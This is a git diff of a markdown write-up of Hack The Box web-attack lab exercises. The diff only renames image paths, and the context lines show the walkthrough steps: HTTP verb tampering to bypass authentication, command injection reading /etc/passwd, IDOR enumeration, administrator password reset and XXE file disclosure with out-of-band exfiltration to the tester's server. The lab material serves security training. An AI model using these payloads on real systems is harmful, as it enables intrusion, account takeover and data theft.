@@ -96,15 +96,15 @@ In this case, the input validation is applied only to parameters received via `G
 
 The target application is a simple file manager. New files can be added by entering a filename into the input field:
 
-![Filtered output](images/basic-auth.png)
+![Filtered output](.images/basic-auth.png)
 
 When attempting to delete a file by clicking the red `Reset` button, an **HTTP Basic Authentication** prompt appears and requests valid credentials:
 
-![Filtered output](images/basic-auth2.png)
+![Filtered output](.images/basic-auth2.png)
 
 Since no valid credentials are available, the request is denied and the user is redirected to a `401 Unauthorized` page:
 
-![Filtered output](images/basic-auth3.png)
+![Filtered output](.images/basic-auth3.png)
 
 Inspecting the redirected URL reveals that the restricted resource is located at `/admin/reset.php`:
 
@@ -118,7 +118,7 @@ At this point, it is unclear whether access is restricted only to `reset.php` or
 http://94.237.57.115:53252/admin/
 ```
 
-![Filtered output](images/basic-auth4.png)
+![Filtered output](.images/basic-auth4.png)
 
 This confirms that the entire `/admin` directory is protected by HTTP Basic Authentication.
 
@@ -128,7 +128,7 @@ The first step in exploiting this behavior is identifying which HTTP method the 
 GET /admin/reset.php?
 ```
 
-![Filtered output](images/basic-auth5.png)
+![Filtered output](.images/basic-auth5.png)
 
 The application uses a `GET` request to perform the action.
 
@@ -138,7 +138,7 @@ We then attempt to bypass authentication by changing the HTTP method. In Burp Su
 POST /admin/reset.php?
 ```
 
-![Filtered output](images/basic-auth6.png)
+![Filtered output](.images/basic-auth6.png)
 
 The server still responds with `401 Unauthorized`, indicating that both `GET` and `POST` methods are correctly protected.
 
@@ -158,7 +158,7 @@ OPTIONS /admin/reset.php?
 
 This time, the server responds with `200 OK`, allowing the request to be processed without authentication:
 
-![Filtered output](images/basic-auth8.PNG)
+![Filtered output](.images/basic-auth8.PNG)
 
 Returning to the main page confirms that the reset functionality was executed. The files have been removed and replaced with a flag:
 
@@ -166,7 +166,7 @@ Returning to the main page confirms that the reset functionality was executed. T
 HTB{4lw4y5_c0v3r_4ll_v3rb5}
 ```
 
-![Filtered output](images/basic-auth9.png)
+![Filtered output](.images/basic-auth9.png)
 
 This vulnerability exists because **authentication controls were applied only to specific HTTP methods**. The server failed to enforce authentication consistently across all supported verbs, allowing an attacker to trigger sensitive functionality using an unexpected method.
 
@@ -189,7 +189,7 @@ GET /index.php?filename=test;
 GET /index.php?filename=test'
 ```
 
-![Filtered output](images/filer-bypass.PNG)
+![Filtered output](.images/filer-bypass.PNG)
 
 All attempts result in an error message:
 
@@ -206,7 +206,7 @@ POST /index.php
 filename=test;
 ```
 
-![Filtered output](images/filter-bypass2.PNG)
+![Filtered output](.images/filter-bypass2.PNG)
 
 This time, the request is processed successfully, confirming that the input validation logic is applied only to `GET` requests. We have successfully bypassed the security filter by using an alternative HTTP method.
 
@@ -222,7 +222,7 @@ filename=test%3bcat+/etc/passwd
 
 The server returns the contents of `/etc/passwd`, confirming **arbitrary command execution**:
 
-![Filtered output](images/filter-bypass3.PNG)
+![Filtered output](.images/filter-bypass3.PNG)
 
 Alternatively, we can copy the file into the web root and access it directly:
 
@@ -234,7 +234,7 @@ filename=test;cp /etc/passwd .
 filename=test%3bcp+/etc/passwd+.
 ```
 
-![Filtered output](images/filter-bypass4.PNG)
+![Filtered output](.images/filter-bypass4.PNG)
 
 This vulnerability exists because **input validation was enforced only for specific HTTP methods**. By switching from `GET` to `POST`, the attacker bypassed the security filter and achieved command execution.
 
@@ -372,7 +372,7 @@ Once an IDOR vulnerability has been identified, the next step is to **systematic
 
 The target application is an employee management system used to host employee records. For simplicity, we assume we are authenticated as a user with `uid=1`. In a real-world scenario, this would require valid login credentials.
 
-![Filtered output](images/idor.png)
+![Filtered output](.images/idor.png)
 
 When navigating to the `Documents` section, we are redirected to:
 
@@ -380,7 +380,7 @@ When navigating to the `Documents` section, we are redirected to:
 http://94.237.57.211:47065/documents.php
 ```
 
-![Filtered output](images/idor2.PNG)
+![Filtered output](.images/idor2.PNG)
 
 On the `Documents` page, several files belonging to our user are listed:
 
@@ -398,7 +398,7 @@ POST /documents.php
 uid=1
 ```
 
-![Filtered output](images/idor4.PNG)
+![Filtered output](.images/idor4.PNG)
 
 By simply modifying the `uid` value, we are able to access documents belonging to another employee:
 
@@ -407,7 +407,7 @@ POST /documents.php
 uid=2
 ```
 
-![Filtered output](images/idor5.PNG)
+![Filtered output](.images/idor5.PNG)
 
 ```
 http://94.237.57.211:47065/documents/Report_2_10_2021.pdf
@@ -467,7 +467,7 @@ In some applications, object references are encoded or hashed before being sent 
 
 When clicking on a file such as `Employment_contract.pdf`, a download process is triggered:
 
-![Filtered output](images/encoded-idor.png)
+![Filtered output](.images/encoded-idor.png)
 
 Intercepting the request reveals that the object reference is encoded:
 
@@ -529,7 +529,7 @@ Both scripts enumerate object identifiers, encode them appropriately, and downlo
 
 Running the script results in multiple downloaded contract files:
 
-![Filtered output](images/encoded-idor3.png)
+![Filtered output](.images/encoded-idor3.png)
 
 The downloaded filenames are obfuscated using `md5` hashing. Since we do not know which file contains the target data, we can inspect the contents of each file.
 
@@ -541,7 +541,7 @@ ls | xargs cat
 
 Most files are empty; however, one file contains the flag:
 
-![Filtered output](images/encoded-idor4.png)
+![Filtered output](.images/encoded-idor4.png)
 
 ---
 
@@ -551,11 +551,11 @@ IDOR vulnerabilities frequently occur in **API endpoints and back-end function c
 
 In this scenario, we assess the target’s `Edit Profile` functionality. 
 
-![Filtered output](images/idor-api.png)
+![Filtered output](.images/idor-api.png)
 
 The `Edit Profile` feature allows employees to modify their own profile information.
 
-![Filtered output](images/idor-api2.png)
+![Filtered output](.images/idor-api2.png)
 
 By intercepting the request in **Burp Suite**, we observe that the application sends profile updates via a `PUT` request containing `JSON` data to the following API endpoint:
 
@@ -563,7 +563,7 @@ By intercepting the request in **Burp Suite**, we observe that the application s
 /profile/api.php/profile/1
 ```
 
-![Filtered output](images/idor-api3.png)
+![Filtered output](.images/idor-api3.png)
 
 We also note that the application relies on a client-side cookie to define the user’s role:
 
@@ -581,21 +581,21 @@ We continue testing the API for **information disclosure vulnerabilities** by ma
 /profile/api.php/profile/5
 ```
 
-![Filtered output](images/idor-api4.png)
+![Filtered output](.images/idor-api4.png)
 
 This request succeeds, and the API returns sensitive information belonging to another user:
 
-![Filtered output](images/idor-api5.png)
+![Filtered output](.images/idor-api5.png)
 
 Most notably, the response reveals the user’s `UUID`, which was previously unknown and could not be predicted. This `UUID` can be leveraged to perform authenticated actions against the target user’s profile.
 
 Using the disclosed `UUID`, we send a PUT request to update the victim’s `full_name` field to `PWNED!`:
 
-![Filtered output](images/idor-api6.png)
+![Filtered output](.images/idor-api6.png)
 
 Repeating the `GET` request confirms that the profile information has been successfully modified:
 
-![Filtered output](images/idor-api7.png)
+![Filtered output](.images/idor-api7.png)
 
 At this stage, we have successfully identified and exploited an **IDOR vulnerability caused by information disclosure via HTTP verb tampering**. The application exposes sensitive user data when accessed with unsupported HTTP methods, enabling unauthorized object access and modification.
 
@@ -613,11 +613,11 @@ done
 
 Executing the script reveals an administrative account with the role `staff_admin`:
 
-![Filtered output](images/idor-api8.png)
+![Filtered output](.images/idor-api8.png)
 
 Finally, by issuing a `PUT` request to modify the administrator’s email address to `flag@idor.htb`, the application displays the flag on the profile page:
 
-![Filtered output](images/idor-api9.png)
+![Filtered output](.images/idor-api9.png)
 
 ---
 
@@ -813,7 +813,7 @@ The target application provides a `Contact Form` located at:
 http://IP:PORT/index.php
 ```
 
-![Filtered output](images/xxe.png)
+![Filtered output](.images/xxe.png)
 
 After submitting the form and intercepting the request in **Burp Suite**, we observe that the application sends the input using a `POST` request containing XML data to the following endpoint:
 
@@ -821,7 +821,7 @@ After submitting the form and intercepting the request in **Burp Suite**, we obs
 http://IP:PORT/submitDetails.php
 ```
 
-![Filtered output](images/xxe2.png)
+![Filtered output](.images/xxe2.png)
 
 This confirms that the application uses XML to transfer user-supplied data to the back-end server, making it a valid candidate for XXE testing. 
 
@@ -835,7 +835,7 @@ Upon submitting the contact form, we observe that the `email` element is reflect
 Check you email <email> for further instructions.
 ```
 
-![Filtered output](images/xxe3.png)
+![Filtered output](.images/xxe3.png)
 
 This makes the `email` element a suitable injection point.
 
@@ -859,7 +859,7 @@ We then reference the entity within the `email` element:
 </email>
 ```
 
-![Filtered output](images/xxe4.png)
+![Filtered output](.images/xxe4.png)
 
 The server response includes the injected entity value, confirming that the application resolves external entities and is therefore **vulnerable to XXE injection**.
 
@@ -881,11 +881,11 @@ We reference the entity as before:
 </email>
 ```
 
-![Filtered output](images/xxe5.png)
+![Filtered output](.images/xxe5.png)
 
 The application successfully returns the contents of `/etc/passwd`, demonstrating **local file disclosure via XXE**.
 
-![Filtered output](images/xxe6.png)
+![Filtered output](.images/xxe6.png)
 
 The same technique can be extended using **PHP filter wrappers** to read application source code. For example, we can base64-encode the contents of `index.php`:
 
@@ -903,11 +903,11 @@ Reference the entity:
 </email>
 ```
 
-![Filtered output](images/xxe7.png)
+![Filtered output](.images/xxe7.png)
 
 The application returns the base64-encoded source code, which can then be decoded locally:
 
-![Filtered output](images/xxe8.png)
+![Filtered output](.images/xxe8.png)
 
 In some configurations, XXE vulnerabilities can be escalated to **remote code execution**. One approach involves abusing the PHP `expect` wrapper to execute system commands.
 
@@ -992,7 +992,7 @@ Upon submission, we observe an inbound request to our server, confirming that th
 10.129.234.170 - - [03/Jan/2026 13:56:08] "GET /xxe.dtd HTTP/1.0" 200 -
 ```
 
-![Filtered output](images/xxe-advanced3.png)
+![Filtered output](.images/xxe-advanced3.png)
 
 The application returns the contents of the target file, wrapped safely inside a `CDATA` section:
 
@@ -1000,7 +1000,7 @@ The application returns the contents of the target file, wrapped safely inside a
 <?php $flag = "HTB{3rr0r5_c4n_l34k_d474}"; ?>
 ```
 
-![Filtered output](images/xxe-advanced2.png)
+![Filtered output](.images/xxe-advanced2.png)
 
 ---
 
@@ -1025,7 +1025,7 @@ The application responds with an error message and reveals the file system path 
 ```
 /var/www/html/error/submitDetails.php
 ```
-![Filtered output](images/xxe-error.png)
+![Filtered output](.images/xxe-error.png)
 
 This confirms that:
 
@@ -1067,7 +1067,7 @@ We include the external DTD within the XML request by defining and invoking a pa
 ]>
 ```
 
-![Filtered output](images/xxe-error2.PNG)
+![Filtered output](.images/xxe-error2.PNG)
 
 Unlike reflective XXE attacks, this technique does **not require referencing the entity within a visible XML element** (e.g., `&joined;`). The leakage occurs entirely during XML parsing.
 
@@ -1079,7 +1079,7 @@ The application returns an error message containing the contents of the target f
 <?php $flag = "HTB{3rr0r5_c4n_l34k_d474}"; ?>
 ```
 
-![Filtered output](images/xxe-error3.png)
+![Filtered output](.images/xxe-error3.png)
 
 This confirms successful **error-based file disclosure via XXE**, even though no application output was directly reflected.
 
@@ -1151,7 +1151,7 @@ Finally, we reference the `content` entity within the vulnerable XML element:
 </email>
 ```
 
-![Filtered output](images/oob.PNG)
+![Filtered output](.images/oob.PNG)
 
 Although no output is returned in the application response, the XML parser processes the external entities during parsing.
 
@@ -1165,7 +1165,7 @@ Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
 10.129.234.170 - - [04/Jan/2026 07:00:24] "GET /?content=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5O ...
 ```
 
-![Filtered output](images/oob2.PNG)
+![Filtered output](.images/oob2.PNG)
 
 The `content` parameter contains the base64-encoded contents of the target file. We decode it locally:
 
@@ -1173,7 +1173,7 @@ The `content` parameter contains the base64-encoded contents of the target file.
 echo "<base64 string>" | base64 -d
 ```
 
-![Filtered output](images/oob3.PNG)
+![Filtered output](.images/oob3.PNG)
 
 This confirms successful **out-of-band data exfiltration via XXE**, even in a fully blind exploitation scenario.
 
@@ -1204,7 +1204,7 @@ Only include the XML declaration followed by the placeholder. The full XML docum
   XXEINJECT
 ```
 
-![Filtered output](images/automated-oob.png)
+![Filtered output](.images/automated-oob.png)
 
 Save the modified request to a file (e.g., `req.txt`).
 
@@ -1226,7 +1226,7 @@ In this case, the extracted file is saved as:
 /XXEinjector/Logs/passwd.log
 ```
 
-![Filtered output](images/automated-oob2.png)
+![Filtered output](.images/automated-oob2.png)
 
 This confirms successful **automated out-of-band data exfiltration** via XXE.
 
@@ -1248,7 +1248,7 @@ Authenticate to `IP:PORT` using the following credentials:
 
 After authentication, we are presented with an **employee profile page**:
 
-![Filtered output](images/exploitation.png)
+![Filtered output](.images/exploitation.png)
 
 The application uses PHP, as indicated by the file extension:
 
@@ -1262,7 +1262,7 @@ Navigating to the `Settings` section redirects us to:
 http://94.237.60.55:30663/settings.php
 ```
 
-![Filtered output](images/exploitation2.png)
+![Filtered output](.images/exploitation2.png)
 
 The only available functionality on this page is password reset.
 
@@ -1274,7 +1274,7 @@ When changing the password, the application performs a `GET` request to the foll
 http://94.237.60.55:30663/api.php/token/74
 ```
 
-![Filtered output](images/exploitation3.png)
+![Filtered output](.images/exploitation3.png)
 
 The response contains an API token in `JSON` format:
 
@@ -1282,7 +1282,7 @@ The response contains an API token in `JSON` format:
 {"token":"e51a8a14-17ac-11ec-8e67-a3c050fe0c26"}
 ```
 
-![Filtered output](images/exploitation4.png)
+![Filtered output](.images/exploitation4.png)
 
 Immediately after, the application sends a `POST` request to:
 
@@ -1290,7 +1290,7 @@ Immediately after, the application sends a `POST` request to:
 http://94.237.60.55:30663/reset.php
 ```
 
-![Filtered output](images/exploitation5.png)
+![Filtered output](.images/exploitation5.png)
 
 This request includes:
 
@@ -1308,7 +1308,7 @@ http://94.237.60.55:30663/api.php/token/1
 Cookie: PHPSESSID=t2mmsfv...dnc2; uid=1
 ```
 
-![Filtered output](images/exploitation6.png)
+![Filtered output](.images/exploitation6.png)
 
 The server returns a **valid API token for another user**:
 
@@ -1316,7 +1316,7 @@ The server returns a **valid API token for another user**:
 {"token":"e51a7c5e-17ac-11ec-8e1e-2f59f27bf33c"}
 ```
 
-![Filtered output](images/exploitation7.png)
+![Filtered output](.images/exploitation7.png)
 
 This confirms the presence of an **Insecure Direct Object Reference (IDOR)** vulnerability.
 
@@ -1324,7 +1324,7 @@ This confirms the presence of an **Insecure Direct Object Reference (IDOR)** vul
 
 We attempt to reuse the new API token to reset the password of `uid=1` via the original `POST` request:
 
-![Filtered output](images/exploitation8.png)
+![Filtered output](.images/exploitation8.png)
 
 The server responds with:
 
@@ -1332,7 +1332,7 @@ The server responds with:
 Access Denied
 ```
 
-![Filtered output](images/exploitation9.png)
+![Filtered output](.images/exploitation9.png)
 
 We attempt to bypass the restriction by changing the request method from `POST` to `GET`:
 
@@ -1340,7 +1340,7 @@ We attempt to bypass the restriction by changing the request method from `POST` 
 http://94.237.60.55:30663/reset.php?uid=1&token=e51a7c5e-17ac-11ec-8e1e-2f59f27bf33c&password=test
 ```
 
-![Filtered output](images/exploitation10.png)
+![Filtered output](.images/exploitation10.png)
 
 The response confirms success:
 
@@ -1348,7 +1348,7 @@ The response confirms success:
 Password changed successfully
 ```
 
-![Filtered output](images/exploitation11.png)
+![Filtered output](.images/exploitation11.png)
 
 We have successfully exploited **IDOR via HTTP verb tampering**.
 
@@ -1360,7 +1360,7 @@ Upon login, the application sends the following request:
 http://94.237.60.55:30663/api.php/user/74
 ```
 
-![Filtered output](images/exploitation12.png)
+![Filtered output](.images/exploitation12.png)
 
 Response:
 
@@ -1368,7 +1368,7 @@ Response:
 {"uid":"74", "username":"htb-student", "full_name":"Paolo Perrone", "company":"Schaefer Inc"}
 ```
 
-![Filtered output](images/exploitation13.png)
+![Filtered output](.images/exploitation13.png)
 
 Changing the `uid` parameter returns information for other users:
 
@@ -1376,7 +1376,7 @@ Changing the `uid` parameter returns information for other users:
 http://94.237.60.55:30663/api.php/user/1
 ```
 
-![Filtered output](images/exploitation14.png)
+![Filtered output](.images/exploitation14.png)
 
 This confirms **unauthenticated user enumeration via IDOR**.
 
@@ -1402,7 +1402,7 @@ We identify an administrator account:
 {"uid":"52", "username":"a.corrales", "full_name":"Amor Corrales", "company":"Administrator"}
 ```
 
-![Filtered output](images/exploitation15.png)
+![Filtered output](.images/exploitation15.png)
 
 **Administrator Account Takeover:**
 
@@ -1420,7 +1420,7 @@ Response:
 {"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}
 ```
 
-![Filtered output](images/exploitation16.png)
+![Filtered output](.images/exploitation16.png)
 
 Using HTTP verb tampering, we reset the administrator password:
 
@@ -1428,7 +1428,7 @@ Using HTTP verb tampering, we reset the administrator password:
 http://94.237.60.55:30663/reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=test
 ```
 
-![Filtered output](images/exploitation17.png)
+![Filtered output](.images/exploitation17.png)
 
 We can now log in as administrator:
 
@@ -1436,7 +1436,7 @@ We can now log in as administrator:
 a.corrales:test
 ```
 
-![Filtered output](images/exploitation18.png)
+![Filtered output](.images/exploitation18.png)
 
 At this point, **privilege escalation is complete**.
 
@@ -1444,13 +1444,13 @@ At this point, **privilege escalation is complete**.
 
 Within the administrator interface, we discover an `ADD EVENT` function:
 
-![Filtered output](images/exploitation19.png)
+![Filtered output](.images/exploitation19.png)
 
 Creating a new event reveals that the application submits data in `XML` format:
 
-![Filtered output](images/exploitation20.png)
+![Filtered output](.images/exploitation20.png)
 
-![Filtered output](images/exploitation21.png)
+![Filtered output](.images/exploitation21.png)
 
 The response reflects the XML `<name>` element, indicating a potential **XXE injection point**.
 
@@ -1472,7 +1472,7 @@ Reference the entity in the vulnerable element:
 </name>
 ```
 
-![Filtered output](images/exploitation22.png)
+![Filtered output](.images/exploitation22.png)
 
 The server responds with base64-encoded data:
 
@@ -1480,7 +1480,7 @@ The server responds with base64-encoded data:
 Event 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' has been created.
 ```
 
-![Filtered output](images/exploitation23.png)
+![Filtered output](.images/exploitation23.png)
 
 Decode the output locally:
 
@@ -1494,7 +1494,7 @@ Flag:
 HTB{m4573r_w3b_4774ck3r}
 ```
 
-![Filtered output](images/exploitation24.png)
+![Filtered output](.images/exploitation24.png)
 
 In this assessment, we successfully chained multiple web vulnerabilities:
 
